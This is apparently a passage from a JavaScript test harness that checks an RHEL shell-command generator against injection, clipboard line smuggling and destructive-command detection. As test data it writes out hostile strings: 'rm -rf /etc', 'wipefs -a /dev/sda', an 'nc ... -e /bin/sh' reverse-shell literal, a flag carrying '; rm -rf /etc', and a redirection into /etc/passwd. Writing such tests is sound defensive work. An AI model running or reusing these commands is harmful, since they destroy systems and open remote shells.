      var gotCmd = got === null ? null : got.command;
      if (gotCmd !== cs.want) {
        stats.failures.push("half-formed / RHEL " + VERSIONS[hr2] + " / " + cs.id +
                            ": expected " + JSON.stringify(cs.want) + ", got " + JSON.stringify(gotCmd));
      }
      /* a command that survives may never end in a dangling option token */
      if (gotCmd !== null && /=$/.test(gotCmd)) {
        stats.failures.push("half-formed / RHEL " + VERSIONS[hr2] + " / " + cs.id +
                            ": the assembled command ends in a dangling '=' — " + JSON.stringify(gotCmd));
      }
    }
  }

  /* version-gated positional: the same template must not be well-formed on one
     release and mis-positioned on another. */
  var vgA = { name: "a", type: "zone", required: false, versions: ["9", "10"] };
  var vgB = { name: "b", type: "zone", required: true };
  for (var vg = 0; vg < VERSIONS.length; vg++) {
    var late = VERSIONS[vg] === "9" || VERSIONS[vg] === "10";
    var midSpec = { id: "hf-gated-mid", fields: [vgA, vgB],
                    template: [{ lit: "probe" }, { field: "a", optional: true }, { field: "b" }] };
    var tailSpec = { id: "hf-gated-tail", fields: [vgA, vgB],
                     template: [{ lit: "probe" }, { field: "b" }, { field: "a", optional: true }] };
    var midWant = late ? "probe 'public' 'trusted'" : null;
    var tailWant = late ? "probe 'trusted' 'public'" : "probe 'trusted'";
    halfFormed += 2;
    var midGot = A.assembleCommand(midSpec, VERSIONS[vg], { a: "public", b: "trusted" }, { patterns: [] });
    var tailGot = A.assembleCommand(tailSpec, VERSIONS[vg], { a: "public", b: "trusted" }, { patterns: [] });
    if ((midGot === null ? null : midGot.command) !== midWant) {
      stats.failures.push("half-formed [gated mid-positional] / RHEL " + VERSIONS[vg] + ": expected " +
                          JSON.stringify(midWant) + ", got " +
                          JSON.stringify(midGot === null ? null : midGot.command));
    }
    if ((tailGot === null ? null : tailGot.command) !== tailWant) {
      stats.failures.push("half-formed [gated trailing positional] / RHEL " + VERSIONS[vg] +
                          ": expected " + JSON.stringify(tailWant) + ", got " +
                          JSON.stringify(tailGot === null ? null : tailGot.command));
    }
  }

  /* ---- MCR-SEC-003: the clipboard payload --------------------------------
     No line of a clipboard payload may be unprefixed except the command itself.
     The header is never rendered in the gutter, so an unprefixed line is text
     that reaches a root shell having never been shown as part of the command.
     Every vector in the fixture is pushed through a header line, plus the
     newline vectors the review reproduced by hand. */
  var clipboardChecks = 0;
  var hostileHeaders = [
    "Prove the host firewall is running\nrm -rf /var/log/audit  # <- never rendered, always copied",
    "line one\r\nrm -rf /etc",
    "line one\rwipefs -a /dev/sda",
    "line one\u2028mkfs.xfs /dev/sdb",
    "line one\u2029lvremove -f /dev/vg0/lv0",
    "nul\u0000and more",
    "vertical\u000Btab",
    "form\u000Cfeed"
  ];
  for (var hv2 = 0; hv2 < vectors.length; hv2++) hostileHeaders.push(vectors[hv2].value);

  for (var ch = 0; ch < hostileHeaders.length; ch++) {
    clipboardChecks++;
    var payload = A.commentPayload(["MD CODE RED — RHEL 9", "intent: " + hostileHeaders[ch],
                                    "blast: green"], "systemctl is-active firewalld");
    if (payload === null) {
      stats.failures.push("clipboard payload " + ch + ": refused to compose for a header value; " +
                          "the header is sanitised, not rejected — only a hostile COMMAND may refuse");
      continue;
    }
    var plines = payload.split("\n");
    if (plines[plines.length - 1] !== "systemctl is-active firewalld") {
      stats.failures.push("clipboard payload " + ch + ": the command is not the last line — " +
                          JSON.stringify(payload));
      continue;
    }
    var bad = null;
    for (var pl = 0; pl < plines.length - 1; pl++) {
      if (plines[pl].indexOf("# ") !== 0) { bad = plines[pl]; break; }
    }
    if (bad !== null) {
      stats.failures.push("clipboard payload " + ch + ": an unprefixed line reached the clipboard — " +
                          JSON.stringify(bad) + " in " + JSON.stringify(payload));
      continue;
    }
    if (/[\u0000-\u0009\u000B-\u001F\u007F-\u009F\u2028\u2029]/.test(payload)) {
      stats.failures.push("clipboard payload " + ch + ": a control character survived into the " +
                          "clipboard text — " + JSON.stringify(payload));
    }
  }

  /* Marcus's reproduction, end to end: the header carried `rm -rf` and blastFor()
     never saw it because it only ever looked at the command. It must see it now. */
  clipboardChecks++;
  var reproPayload = A.commentPayload(
    ["MD CODE RED v1.0.0-dev — RHEL 9",
     "intent: Prove the host firewall is running\nrm -rf /var/log/audit  # <- never rendered, always copied",
     "blast: green"], "systemctl is-active firewalld");
  var reproBlast = A.blastFor(reproPayload, "green",
                              [{ id: "dp-rm-rf", match: "rm -rf", label: "l", why: "w", blast_floor: "red" }]);
  if (reproBlast.blast !== "red") {
    stats.failures.push("invariant: MCR-SEC-003 regression: a destructive pattern carried in the comment header did not " +
             "raise blast — blastFor() is not seeing the full clipboard payload");
  }
  /* a command that is not single-line printable text may not compose a payload */
  clipboardChecks++;
  if (A.commentPayload(["x"], "systemctl is-active firewalld\nrm -rf /") !== null) {
    stats.failures.push("invariant: MCR-SEC-003: commentPayload() accepted a multi-line command, which would put an " +
             "unprefixed second line on the clipboard");
  }
  if (A.headerSafe("a\nb\r\nc\u2028d") !== "a b c d") {
    stats.failures.push("invariant: MCR-SEC-003: headerSafe() does not flatten every line terminator to a space");
  }

  /* ---- MCR-SEC-006: template[].flag and template[].lit are curated, not
     unchecked. Both injection templates from the review must return null. ---- */
  var tokenChecks = 0;
  var badTokenSpecs = [
    ["flag carries a statement separator",
     { id: "tok-flag", fields: [{ name: "z", type: "zone", required: true }],
       template: [{ lit: "firewall-cmd" }, { flag: "--zone; rm -rf /etc; #", field: "z" }] },
     { z: "public" }],
    ["lit is a whole second command",
     { id: "tok-lit", fields: [],
       template: [{ lit: "echo hi; nc 10.0.0.1 4444 -e /bin/sh" }] },
     {}],
    ["flag carries a space",
     { id: "tok-flag-space", fields: [{ name: "z", type: "zone", required: true }],
       template: [{ lit: "firewall-cmd" }, { flag: "--zone --permanent", field: "z" }] },
     { z: "public" }],
    ["flag carries a quote",
     { id: "tok-flag-quote", fields: [{ name: "z", type: "zone", required: true }],
       template: [{ lit: "firewall-cmd" }, { flag: "--zone'", field: "z" }] },
     { z: "public" }],
    ["lit carries a backtick",
     { id: "tok-lit-backtick", fields: [],
       template: [{ lit: "echo `id`" }] },
     {}],
    ["lit carries a redirection",
     { id: "tok-lit-redir", fields: [],
       template: [{ lit: "cat>/etc/passwd" }] },
     {}],
    ["flag is not a flag at all",
     { id: "tok-flag-bare", fields: [{ name: "z", type: "zone", required: true }],
       template: [{ lit: "firewall-cmd" }, { flag: "zone", field: "z" }] },
     { z: "public" }]
  ];
  for (var bt = 0; bt < badTokenSpecs.length; bt++) {
    for (var btr = 0; btr < VERSIONS.length; btr++) {
      tokenChecks++;
      var btres = A.assembleCommand(badTokenSpecs[bt][1], VERSIONS[btr], badTokenSpecs[bt][2],
                                    { patterns: [] });
      if (btres !== null) {
        stats.failures.push("token allow-list / RHEL " + VERSIONS[btr] + " / " +
                            badTokenSpecs[bt][0] + ": assembled " + JSON.stringify(btres.command) +
                            " instead of returning null");
      }
    }
  }
  /* control: the legitimate tokens those hostile ones are variations of still work */
  for (var gtr = 0; gtr < VERSIONS.length; gtr++) {
    tokenChecks++;
    var good = A.assembleCommand(
      { id: "tok-ok", fields: [{ name: "z", type: "zone", required: true }],
        template: [{ lit: "firewall-cmd" }, { flag: "--zone", field: "z" }, { lit: "--permanent" }] },
      VERSIONS[gtr], { z: "public" }, { patterns: [] });
    if (!good || good.command !== "firewall-cmd --zone='public' --permanent") {
      stats.failures.push("token allow-list control / RHEL " + VERSIONS[gtr] +
                          ": a legitimate flag and lit were refused — " +
                          JSON.stringify(good === null ? null : good.command));
    }
  }

  /* ---- MCR-SEC-008: every destructive pattern must be able to fire ---------
     shQuote() inserts a quote at every literal->value boundary, so a pattern
     that spans one could never match the post-quoting string. blastFor() now
     also matches the unquoted projection. Each row of content/dangerous.json is
     asserted to fire on a synthetic assembled command whose VALUE carries the
     pattern text; a row that can never fire fails this gate rather than sitting
     in the table looking like protection. */
  var patternChecks = 0;
  var dangerous = JSON.parse(fs.readFileSync(path.join(REPO, "content", "dangerous.json"), "utf8"));
  var patterns = dangerous.patterns || [];
  if (!patterns.length) stats.failures.push("content/dangerous.json carries no patterns to check");
  for (var dp = 0; dp < patterns.length; dp++) {
    var pat = patterns[dp];
    patternChecks++;
    var synth = A.assembleCommand(
      { id: "blast-" + pat.id, blast: "green",
        fields: [{ name: "v", type: "comment", required: true }],
        template: [{ lit: "probe" }, { field: "v" }] },
      "9", { v: pat.match }, { patterns: patterns });
    if (synth === null) {
      stats.failures.push("destructive pattern '" + pat.id + "': its match text could not be put " +
                          "into a synthetic command, so this row has never been seen to fire");
      continue;
    }
    if (synth.blast !== pat.blast_floor && !(pat.blast_floor === "yellow" && synth.blast === "red")) {
      stats.failures.push("destructive pattern '" + pat.id + "' (" + JSON.stringify(pat.match) +
                          ") did not raise blast to " + pat.blast_floor + " on " +
                          JSON.stringify(synth.command) + " — it fired on nothing");
    }
  }
  /* Marcus's C8 test, verbatim: `rm -rf /` must fire on `rm -rf '/etc/pki'` */
  patternChecks++;
  var rmrf = A.assembleCommand(
    { id: "blast-rm-rf-root", blast: "green",
      fields: [{ name: "p", type: "path", required: true }],
      template: [{ lit: "rm" }, { lit: "-rf" }, { field: "p" }] },
    "9", { p: "/etc/pki" }, { patterns: [{ id: "rm-rf", match: "rm -rf /", label: "l", why: "w",
                                           blast_floor: "red" }] });
  if (!rmrf || rmrf.command !== "rm -rf '/etc/pki'") {
    stats.failures.push("MCR-SEC-008 regression: the synthetic command did not assemble as expected");
  } else if (rmrf.blast !== "red") {
    stats.failures.push("MCR-SEC-008 regression: 'rm -rf /' did not fire on " +
                        JSON.stringify(rmrf.command) + " — a pattern spanning a value boundary is " +
                        "still silently disabled by the assembler's own quoting");
  }
  /* control: a pattern that genuinely does not occur must NOT fire */
  patternChecks++;
  var quiet = A.assembleCommand(
    { id: "blast-quiet", blast: "green",
      fields: [{ name: "p", type: "path", required: true }],
      template: [{ lit: "ls" }, { field: "p" }] },
    "9", { p: "/etc/pki" }, { patterns: [{ id: "rm-rf", match: "rm -rf /", label: "l", why: "w",
                                           blast_floor: "red" }] });
  if (!quiet || quiet.blast !== "green") {
    stats.failures.push("MCR-SEC-008 control: an unrelated command was rated " +
                        (quiet ? quiet.blast : "null") + " — the de-quoted matcher fires on anything");
  }

  /* ---- CR-T-17..25: every REAL generator spec, every REAL field -----------
     Everything above fuzzes a SYNTHETIC spec per field type — proof that the
     assembler's allow-lists hold in general. It says nothing about whether a
     particular generator's template wires a field to the slot its type
     promises, or whether an author-picked "documented" flag/lit token is
     still a closed-grammar token. This sweep loads content/commands.json
     itself and drives the exact specs CR-T-17..25 ships: for every generator
     entry and every field it declares, every OTHER field is held at its
     type's benign value and the field under test takes every hostile vector
     in turn, on every release the field is offered on. A field new to a
     future generator is picked up automatically — nothing here names a
     generator or a field by id. */
  var contentSpecChecks = 0;
  var commandsContent = JSON.parse(fs.readFileSync(path.join(REPO, "content", "commands.json"), "utf8"));
  var specEntries = (commandsContent.entries || []).filter(function (e) { return !!e.template; });
  if (!specEntries.length) {
    stats.failures.push("content/commands.json carries no generator (template) entries for the " +
                        "content-spec sweep to fuzz — CR-T-17's registry has nothing to prove itself on");
  }
  function benignFor(field) {
    if (field.type === "enum") {
      var opts = field.options || [];
      if (!opts.length) return undefined;
      var first = opts[0];
      return (typeof first === "string") ? first : first.value;
    }
    var def = fx.field_types[field.type];
    return def ? def.benign : undefined;
  }
  for (var se = 0; se < specEntries.length; se++) {
    var centry = specEntries[se];
    var cfields = centry.fields || [];
    var centryVersions = centry.versions || VERSIONS;
    for (var cf = 0; cf < cfields.length; cf++) {
      var targetField = cfields[cf];
      var targetBenign = benignFor(targetField);
      if (targetBenign === undefined) {
        stats.failures.push("content spec " + centry.id + ": field '" + targetField.name +
                            "' has type '" + targetField.type + "', which tests/fixtures/" +
                            "hostile-inputs.json has no benign value for — this sweep cannot fuzz it");
        continue;
      }
      var baseValues = {};
      for (var of = 0; of < cfields.length; of++) {
        if (of === cf) continue;
        var otherBenign = benignFor(cfields[of]);
        if (otherBenign !== undefined) baseValues[cfields[of].name] = otherBenign;
      }
      var fieldVersions = targetField.versions || VERSIONS;
      for (var cv = 0; cv < centryVersions.length; cv++) {
        var version = centryVersions[cv];
        if (VERSIONS.indexOf(version) < 0) continue;         /* spec.versions has to name a real release */
        if (fieldVersions.indexOf(version) < 0) continue;    /* field itself is gated off this release */
        for (var vv = 0; vv < vectors.length; vv++) {
          var vec = vectors[vv];
          /* The "empty" vector on an OPTIONAL field is not a hostile-input
             question at all: an empty value is "not supplied" (validateSpec),
             so the field is simply dropped and the template still assembles —
             correct, and already the exact case the harness's own
             never-half-formed sweep exists to prove, on every template shape.
             Asserting "reject" here would fail on correct behaviour, not catch
             a bug — required fields still get the empty vector, since an
             empty REQUIRED field must be rejected. */
          if (vec.id === "empty" && !targetField.required) continue;
          var values = {};
          for (var bk in baseValues) {
            if (Object.prototype.hasOwnProperty.call(baseValues, bk)) values[bk] = baseValues[bk];
          }
          values[targetField.name] = vec.value;
          var probe = { id: centry.id, tool: centry.tool, blast: centry.blast || "green",
                        fields: centry.fields, template: centry.template, versions: centry.versions };
          probe._hostileField = targetField.name;
          probe._benign = targetBenign;
          contentSpecChecks++;
          check(centry.id + " / field " + targetField.name + " / " + vec.id + " / RHEL " + version,
                vec["class"], probe, version, values, vec.value,
                targetField.type === "comment" ? vec.free_text : "reject");
        }
      }
    }
  }

  /* ---- CR-T-17..25: the GOLDEN-COMMAND table (MCR-SEC-015 / E1, E6) -------
     The sweep above is a containment oracle and nothing more. This is the
     validity oracle Marcus Reed's D4 review required: for every generator, on
     every release, the exact command it must emit for a stated set of benign
     values, hand-authored from each tool's man page in
     tests/fixtures/golden-commands.json and never generated from the assembler.

     Three assertions per row, plus two completeness assertions over the table:
       1. EXACT equality with the golden string (or null where the generator is
          gated off that release — null, never a shortened command).
       2. getopt(3) syntax, via optionSyntaxErrors(): no short option may be
          joined to its value with '='.
       3. every long option the template binds to a value still carries its
          '=' join, so the E1 fix cannot over-correct and quietly turn
          `--unit='sshd.service'` into `--unit 'sshd.service'` unnoticed.
     ...and the blast rating the row declares, computed against the REAL
     content/dangerous.json table rather than an empty one. */
  var golden = JSON.parse(fs.readFileSync(path.join(REPO, "tests", "fixtures",
                                                    "golden-commands.json"), "utf8"));
  var goldenRows = golden.generators || {};
  var realPatterns = (JSON.parse(fs.readFileSync(path.join(REPO, "content", "dangerous.json"),
                                                 "utf8")).patterns) || [];
  var goldenChecks = 0, syntaxChecks = 0, inspectorChecks = 0;
  for (var gs = 0; gs < specEntries.length; gs++) {
    var gentry = specEntries[gs];
    var grow = Object.prototype.hasOwnProperty.call(goldenRows, gentry.id) ? goldenRows[gentry.id] : null;
    if (grow === null) {
      stats.failures.push("golden table: generator " + gentry.id + " has no row in tests/fixtures/" +
                          "golden-commands.json. A generator whose exact command is not written down " +
                          "is covered by the containment oracle only, which is how MCR-SEC-015 shipped");
      continue;
    }
    var glongs = longValueFlags(gentry);
    for (var gv2 = 0; gv2 < VERSIONS.length; gv2++) {
      var gver = VERSIONS[gv2];
      if (!Object.prototype.hasOwnProperty.call(grow.commands || {}, gver)) {
        stats.failures.push("golden table: " + gentry.id + " has no expected command for RHEL " + gver);
        continue;
      }
      var want = grow.commands[gver];
      goldenChecks++;
      var gres;
      try {
        gres = A.assembleCommand(gentry, gver, grow.values || {}, { patterns: realPatterns });
      } catch (ge) {
        stats.failures.push("golden " + gentry.id + " / RHEL " + gver + ": assembler threw " + ge.message);
        continue;
      }
      var gotCommand = gres === null ? null : gres.command;
      if (gotCommand !== want) {
        stats.failures.push("golden " + gentry.id + " / RHEL " + gver + ": expected " +
                            JSON.stringify(want) + " but the assembler produced " +
                            JSON.stringify(gotCommand) + " — " + (grow.pins || ""));
        continue;
      }
      if (gres === null) continue;                 /* correctly gated off this release */
      if (gres.blast !== grow.blast) {
        stats.failures.push("golden " + gentry.id + " / RHEL " + gver + ": blast is '" + gres.blast +
                            "', the table says '" + grow.blast + "'");
      }
      /* MCR-SEC-023: the flag-by-flag panel must name every option the command
         shows, in the order it shows them — option tokens AND option-shaped
         literals. A panel silent about a flag that is present is a smaller
         version of a panel describing one that is not. */
      inspectorChecks++;
      var gotFlags = [];
      for (var gf = 0; gf < gres.flags.length; gf++) gotFlags.push(gres.flags[gf].flag);
      var wantFlags = grow.flags || [];
      if (gotFlags.join(" ") !== wantFlags.join(" ")) {
        stats.failures.push("golden " + gentry.id + " / RHEL " + gver + ": the inspector's flag list " +
                            "is [" + gotFlags.join(", ") + "], the table says [" + wantFlags.join(", ") +
                            "] — the panel and the command must agree (MCR-SEC-023)");
      }
      for (var gfc = 0; gfc < gotFlags.length; gfc++) {
        inspectorChecks++;
        if (gres.command.indexOf(gotFlags[gfc]) < 0) {
          stats.failures.push("golden " + gentry.id + " / RHEL " + gver + ": the inspector names flag " +
                              gotFlags[gfc] + ", which is not in " + JSON.stringify(gres.command) +
                              " — describing a flag that is not present is the Explainer row of " +
                              "threat-model §4");
        }
      }
      syntaxChecks++;
      var gsyn = optionSyntaxErrors(gres.command);
      if (gsyn.length) {
        stats.failures.push("golden " + gentry.id + " / RHEL " + gver + ": " + gsyn.join("; ") +
                            " — in " + JSON.stringify(gres.command));
      }
      for (var gl = 0; gl < glongs.length; gl++) {
        syntaxChecks++;
        if (gres.command.indexOf(glongs[gl] + "='") < 0) {
          stats.failures.push("golden " + gentry.id + " / RHEL " + gver + ": long option " +
                              glongs[gl] + " lost its '=' join in " + JSON.stringify(gres.command) +
                              " — E1 removes the '=' from SHORT options only");
        }
      }
    }
  }
  var goldenIds = Object.keys(goldenRows);
  for (var gi = 0; gi < goldenIds.length; gi++) {
    var known = false;
    for (var gk = 0; gk < specEntries.length; gk++) {
      if (specEntries[gk].id === goldenIds[gi]) { known = true; break; }
    }
    if (!known) {
      stats.failures.push("golden table: row '" + goldenIds[gi] + "' names a generator that is not " +
                          "in content/commands.json — a stale expectation proves nothing");
    }
  }
  /* negative control: the syntax oracle must be able to fail, on the exact
     defect MCR-SEC-015 reported and on the long form it must NOT flag. */
  if (!optionSyntaxErrors("auditctl -w='/etc/motd' -p='r' -k='identity'").length) {
    stats.failures.push("invariant: the option-syntax oracle rated MCR-SEC-015's own reproduction " +
                        "as valid getopt syntax — it cannot fail and therefore proves nothing");
  }
  if (optionSyntaxErrors("firewall-cmd --set-default-zone='public' --permanent").length) {
    stats.failures.push("invariant: the option-syntax oracle flagged a correct GNU long option");
  }
  if (optionSyntaxErrors("rsyslogd -N1 -f '/etc/rsyslog.conf'").length) {
    stats.failures.push("invariant: the option-syntax oracle flagged the glued short option -N1, " +
                        "which is legal");
  }

  /* ---- the DERIVED positional discriminator (MCR-SEC-018/022, E3 and E7) --
     Marcus Reed's D4 addendum table, run as a test on every release.

     The D1 rule says a conditional literal occupies an argument slot, so it may
     only vanish when every later positional token vanishes with it. Milo's first
     answer was a DECLARED discriminator: a `flag` key alongside `lit` told the
     rule "this literal is an option, look away". Neither half checked that the
     declaration was true, so `{lit:"0644", flag:"-P", requires:"m"}` was
     accepted and reopened MCR-SEC-013 through the key that was meant to close
     it. A rule a sibling key silently disables is not a rule.

     The discriminator is now DERIVED from the word the token actually emits: a
     `lit` matching FLAG_TOKEN_RE is an option and never occupies an argument
     slot. There is no second key to disagree with the first, so the smuggle
     cannot be expressed — and a token carrying both `lit` and `flag` is refused
     outright, at build time and at run time, because `flag` emits nothing there
     and exists only to point the rule away from the word that does.

     Template under test: [{lit:"chmod"}, TOKEN, {field:"p"}] — `m` optional,
     `p` a required path, exactly the shape of the original MCR-SEC-013 vector. */
  var discChecks = 0;
  function discSpec(tok) {
    return { id: "harness-discriminator", tool: "harness", blast: "green",
             fields: [{ name: "m", type: "integer", required: false, versions: VERSIONS },
                      { name: "p", type: "path", required: true, versions: VERSIONS }],
             template: [{ lit: "chmod" }, tok, { field: "p" }] };
  }
  var discCases = [
    [{ lit: "0644", requires: "m" }, "chmod 0644 '/etc/foo'", null,
     "the baseline MCR-SEC-013 vector: a bare conditional literal is positional, so it may not " +
     "drop while the path after it survives"],
    [{ lit: "-P", flag: "-P", requires: "m" }, null, null,
     "the dual-key shape the branch shipped twice. `flag` emits nothing on a lit token; it only " +
     "switched the positional rule off. Refused now even when it tells the truth, because a rule " +
     "that can be switched off by a key nobody checks is not a rule (MCR-SEC-022)"],
    [{ lit: "0644", flag: "-P", requires: "m" }, null, null,
     "Marcus's smuggle: an ARGUMENT literal wearing an option's flag key. This assembled " +
     "`chmod '/etc/foo'` with the path in the mode slot — MCR-SEC-013, reopened"],
    [{ lit: "/etc/shadow", flag: "-x", requires: "m" }, null, null,
     "the same smuggle with a path literal, which is the shape that actually hurts"],
    [{ lit: "-P", requires: "m" }, "chmod -P '/etc/foo'", "chmod '/etc/foo'",
     "the DERIVED answer, and the shape gen-setsebool-set and gen-lvextend-grow now use: an " +
     "option-shaped literal is an option, so dropping it shifts nothing and both states are " +
     "correct — with no key at all"]
  ];
  for (var dc = 0; dc < discCases.length; dc++) {
    for (var dv = 0; dv < VERSIONS.length; dv++) {
      var dspec = discSpec(discCases[dc][0]);
      discChecks += 2;
      var withM = A.assembleCommand(dspec, VERSIONS[dv], { m: "7", p: "/etc/foo" }, { patterns: [] });
      var noM = A.assembleCommand(dspec, VERSIONS[dv], { p: "/etc/foo" }, { patterns: [] });
      var gotWith = withM === null ? null : withM.command;
      var gotNo = noM === null ? null : noM.command;
      if (gotWith !== discCases[dc][1]) {
        stats.failures.push("discriminator / RHEL " + VERSIONS[dv] + " / " +
                            JSON.stringify(discCases[dc][0]) + " with 'm' supplied: expected " +
                            JSON.stringify(discCases[dc][1]) + ", got " + JSON.stringify(gotWith) +
                            " — " + discCases[dc][3]);
      }
      if (gotNo !== discCases[dc][2]) {
        stats.failures.push("discriminator / RHEL " + VERSIONS[dv] + " / " +
                            JSON.stringify(discCases[dc][0]) + " with 'm' ABSENT: expected " +
                            JSON.stringify(discCases[dc][2]) + ", got " + JSON.stringify(gotNo) +
                            " — " + discCases[dc][3]);
      }
    }
  }
  /* MCR-SEC-023 on the derived shape: the option-shaped literal reaches the
     inspector's flag list, so the panel and the command say the same thing. */
  discChecks++;
  var discFlagged = A.assembleCommand(discSpec({ lit: "-P", requires: "m" }), "9",
                                      { m: "7", p: "/etc/foo" }, { patterns: [] });
  if (!discFlagged || discFlagged.flags.length !== 1 || discFlagged.flags[0].flag !== "-P") {
    stats.failures.push("discriminator: an option-shaped literal did not reach the inspector's flag " +
                        "list — flags=" + JSON.stringify(discFlagged ? discFlagged.flags : null) +
                        " (MCR-SEC-023)");
  } else if (discFlagged.flags[0].explain !== null) {
    stats.failures.push("discriminator: an uncurated option-shaped literal was given an explanation " +
                        "rather than null — the no-guess law renders 'unverified' from null");
  }
  /* control: the shipped content carries no dual-key token any more. */
  for (var dk = 0; dk < specEntries.length; dk++) {
    var dtpl = specEntries[dk].template || [];
    for (var dt = 0; dt < dtpl.length; dt++) {
      discChecks++;
      if (dtpl[dt] && dtpl[dt].lit !== undefined && dtpl[dt].flag !== undefined) {
        stats.failures.push("content spec " + specEntries[dk].id + " template[" + dt + "] carries " +
                            "both `lit` and `flag` — the declared discriminator is gone and the " +
                            "derived one needs no key (MCR-SEC-022)");
      }
    }
  }

  /* ---- closed grammars where one exists (MCR-SEC-016, condition E4) ------
     threat-model §3.1 requires a closed grammar wherever the field has one, and
     `comment` — the single free-text type — was carrying four fields that do:
     two LVM sizes and two group lists. Nothing was injectable (every value is
     shQuote'd and every one of them fails closed at the target tool), but
     `lvextend -L 'ticket RFC-1234' -r '/dev/vg0/lv0'` assembled, returned
     non-null and rendered Copy — a nonsense LVM size accepted as a complete
     command on a yellow-blast storage tool.

     The sharp case is the one the placeholder now has to teach: `10G` and
     `+10G` are BOTH valid LVM sizes and they mean different things — set the
     volume to 10G, versus grow it by 10G. A grammar that accepts both still
     has to show the operator which one they typed. */
  var grammarChecks = 0;
  var grammarCases = [
    ["lvm_size", "10G", true], ["lvm_size", "+10G", true], ["lvm_size", "512", true],
    ["lvm_size", "1.5T", true], ["lvm_size", "100%FREE", true], ["lvm_size", "50%VG", true],
    ["lvm_size", "8m", true],
    ["lvm_size", "ticket RFC-1234", false], ["lvm_size", "10 G", false],
    ["lvm_size", "10GB", false], ["lvm_size", "-10G", false], ["lvm_size", "big", false],
    ["lvm_size", "10G;id", false], ["lvm_size", "100%EVERYTHING", false],
    ["group_list", "wheel", true], ["group_list", "wheel,docker", true],
    ["group_list", "_svc,wheel,docker", true],
    ["group_list", "wheel docker", false], ["group_list", "wheel,,docker", false],
    ["group_list", "Wheel", false], ["group_list", "wheel;id", false],
    ["group_list", "wheel,", false], ["group_list", "-wheel", false]
  ];
  for (var gc = 0; gc < grammarCases.length; gc++) {
    grammarChecks++;
    var gcType = grammarCases[gc][0];
    if (!A.FIELD_TYPES[gcType]) {
      stats.failures.push("field grammar: there is no '" + gcType + "' field type. MCR-SEC-016 " +
                          "requires a closed grammar where the field has one, and `comment` — the " +
                          "one free-text type in the product — is not it");
      continue;
    }
    var gcRes = A.validateField(gcType, grammarCases[gc][1], { name: "v", type: gcType });
    if (gcRes.ok !== grammarCases[gc][2]) {
      stats.failures.push("field grammar: " + gcType + " " + JSON.stringify(grammarCases[gc][1]) +
                          " was " + (gcRes.ok ? "accepted" : "refused (" + gcRes.reason + ")") +
                          ", expected " + (grammarCases[gc][2] ? "accepted" : "refused"));
    }
  }
  /* MCR-SEC-016 reproduction, verbatim from the D4 review, kept as a named
     regression: the real generator, the real field, the value Marcus typed. */
  for (var grv = 0; grv < VERSIONS.length; grv++) {
    grammarChecks++;
    var lvSpec = null;
    for (var lvi = 0; lvi < specEntries.length; lvi++) {
      if (specEntries[lvi].id === "gen-lvextend-grow") lvSpec = specEntries[lvi];
    }
    if (lvSpec === null) {
      stats.failures.push("MCR-SEC-016 regression: gen-lvextend-grow is not in content/commands.json");
      break;
    }
    var lvBad = A.assembleCommand(lvSpec, VERSIONS[grv],
                                  { size: "ticket RFC-1234", resizefs: "yes",
                                    lvpath: "/dev/vg0/lv0" }, { patterns: [] });
    if (lvBad !== null) {
      stats.failures.push("MCR-SEC-016 regression / RHEL " + VERSIONS[grv] + ": a nonsense LVM size " +
                          "assembled into a complete command — " + JSON.stringify(lvBad.command));
    }
    grammarChecks++;
    var lvGood = A.assembleCommand(lvSpec, VERSIONS[grv],
                                   { size: "+10G", resizefs: "yes", lvpath: "/dev/vg0/lv0" },
                                   { patterns: [] });
    if (lvGood === null) {
      stats.failures.push("MCR-SEC-016 control / RHEL " + VERSIONS[grv] + ": the '+10G' grow form " +
                          "was refused — check the healthy case before believing the signal");
    }
  }

  /* ---- the DERIVED join rule, token by token (MCR-SEC-015 / E1) ----------
     The golden table proves the 24 shipped generators. This proves the RULE,
     on token shapes no generator writes today, so the twenty-first generator
     inherits it: the join is computed from the flag's shape, the two escape
     hatches are legal only on the shape they belong to, and a token that
     declares a join its shape derives is a disagreement — null, never a guess.
     extract/schema.py refuses each of these at build time; this is the run-time
     backstop, and the two halves have to agree. */
  var joinChecks = 0;
  function joinSpec(tok) {
    return { id: "harness-join", tool: "harness", blast: "green",
             fields: [{ name: "v", type: "integer", required: true, versions: VERSIONS }],
             template: [{ lit: "probe" }, tok] };
  }
  var joinCases = [
    [{ flag: "-M", field: "v" }, "probe -M '42'", "a short option derives a SPACE join"],
    [{ flag: "-M", field: "v", join: "glued" }, "probe -M'42'", "join:\"glued\" emits -Xvalue"],
    [{ flag: "--value", field: "v" }, "probe --value='42'", "a long option derives an '=' join"],
    [{ flag: "--value", field: "v", eq: false }, "probe --value '42'", "eq:false spaces a long option"],
    [{ flag: "-M", field: "v", eq: false }, null,
     "a SHORT option may not declare eq — the join is derived, and eq:false here is an author " +
     "asserting a rule the shape already states"],
    [{ flag: "-M", field: "v", eq: true }, null,
     "a SHORT option may not declare eq:true — that is the MCR-SEC-015 defect, spelled out"],
    [{ flag: "--value", field: "v", join: "glued" }, null,
     "a LONG option may not declare join"],
    [{ flag: "-M", field: "v", join: "spaced" }, null, "\"glued\" is the only declared join"]
  ];
  for (var jc = 0; jc < joinCases.length; jc++) {
    for (var jv = 0; jv < VERSIONS.length; jv++) {
      joinChecks++;
      var jres = A.assembleCommand(joinSpec(joinCases[jc][0]), VERSIONS[jv], { v: "42" },
                                   { patterns: [] });
      var jgot = jres === null ? null : jres.command;
      if (jgot !== joinCases[jc][1]) {
        stats.failures.push("join rule / RHEL " + VERSIONS[jv] + " / " +
                            JSON.stringify(joinCases[jc][0]) + ": expected " +
                            JSON.stringify(joinCases[jc][1]) + ", got " + JSON.stringify(jgot) +
                            " — " + joinCases[jc][2]);
      }
    }
  }

  /* ---- positive control -------------------------------------------------
     A validator that rejects everything would pass every assertion above while
     making the product useless, so each field type's benign value must
     assemble, on every release, in every argument shape. Check the healthy case
     before believing the signal. */
  var inv = [], controls = 0;
  for (var pt = 0; pt < types.length; pt++) {
    var pdef = fx.field_types[types[pt]];
    for (var pr = 0; pr < VERSIONS.length; pr++) {
      var pshapes = [flagSpec(types[pt], pdef), argSpec(types[pt], pdef), spacedFlagSpec(types[pt], pdef)];
      for (var ps = 0; ps < pshapes.length; ps++) {
        controls++;
        var pres = A.assembleCommand(pshapes[ps], VERSIONS[pr], { v: pdef.benign }, { patterns: [] });
        if (pres === null) {
          inv.push("positive control: benign " + types[pt] + " value " + JSON.stringify(pdef.benign) +
                   " was rejected on RHEL " + VERSIONS[pr] + " (" + pshapes[ps].id + ")");
        } else if (pres.command.indexOf("'" + pdef.benign + "'") < 0) {
          inv.push("positive control: benign " + types[pt] + " value is not present as a single-quoted " +
                   "token in " + JSON.stringify(pres.command));
        }
      }
    }
  }
